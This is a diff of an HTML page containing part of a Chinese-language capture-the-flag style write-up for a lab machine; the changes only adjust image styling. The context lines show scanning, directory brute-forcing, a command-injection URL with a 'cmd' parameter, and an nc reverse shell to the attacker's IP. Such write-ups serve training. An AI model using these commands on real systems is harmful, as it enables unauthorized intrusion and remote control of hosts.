@@ -263,7 +263,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 <p>后台挂个漏扫<br>
 <code class="notranslate">nmap --script=vuln --min-rate 10000 -p22,80 192.168.218.212 -oA nmapScan/vuln</code></p>
 <h2>初始信息枚举</h2>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/f27b0f62-7787-46e0-ae49-7ca23967379d"><img width="1919" height="969" alt="Image" src="https://github.com/user-attachments/assets/f27b0f62-7787-46e0-ae49-7ca23967379d" style="max-width: 100%; height: auto; max-height: 969px;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/f27b0f62-7787-46e0-ae49-7ca23967379d"><img width="1919" height="969" alt="Image" src="https://github.com/user-attachments/assets/f27b0f62-7787-46e0-ae49-7ca23967379d" style="max-width: 100%; height: auto; max-height: 969px;; aspect-ratio: 1919 / 969; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
 <p>主页是靶机的基本信息</p>
 <p>扫一下目录</p>
 <pre class="notranslate"><code class="notranslate">└─$ gobuster dir -u http://192.168.218.212/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x html,php,txt
@@ -303,14 +303,14 @@ lol try harder bro<br>
 <p>然后logs，看不懂给AI说是系统启动日志，没什么用，难道是URL有参数？fuzz了一下好像没有。</p>
 <p>没思路了......</p>
 <p>扒拉扒拉才发现漏掉了index中的源码</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/05de392d-fe55-4386-bc46-a805533f6a2a"><img width="1919" height="964" alt="Image" src="https://github.com/user-attachments/assets/05de392d-fe55-4386-bc46-a805533f6a2a" style="max-width: 100%; height: auto; max-height: 964px;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/05de392d-fe55-4386-bc46-a805533f6a2a"><img width="1919" height="964" alt="Image" src="https://github.com/user-attachments/assets/05de392d-fe55-4386-bc46-a805533f6a2a" style="max-width: 100%; height: auto; max-height: 964px;; aspect-ratio: 1919 / 964; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
 <p>有新发现<br>
 是一段很多次的base64编码，一直解码最后是</p>
 <pre class="notranslate"><code class="notranslate">└─$ echo 'WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK' | base64 -d | base64 -d | base64 -d
 workinginprogress.php
 </code></pre>
 <p>没有爆出来的新目录，访问一下。</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/836cd36e-ae34-4995-9018-95046dd03d22"><img width="1919" height="967" alt="Image" src="https://github.com/user-attachments/assets/836cd36e-ae34-4995-9018-95046dd03d22" style="max-width: 100%; height: auto; max-height: 967px;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/836cd36e-ae34-4995-9018-95046dd03d22"><img width="1919" height="967" alt="Image" src="https://github.com/user-attachments/assets/836cd36e-ae34-4995-9018-95046dd03d22" style="max-width: 100%; height: auto; max-height: 967px;; aspect-ratio: 1919 / 967; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
 <p>好像有命令注入，直接一下试出来了参数cmd，运气不错<code class="notranslate">http://192.168.218.212/workinginprogress.php?cmd=ls%20/</code></p>
 <p>不知道是不是没有bash，shell打不回来，但是有nc <code class="notranslate">nc 10.10.14.8 4444 -e /bin/bash</code></p>
 <h1>提权</h1>
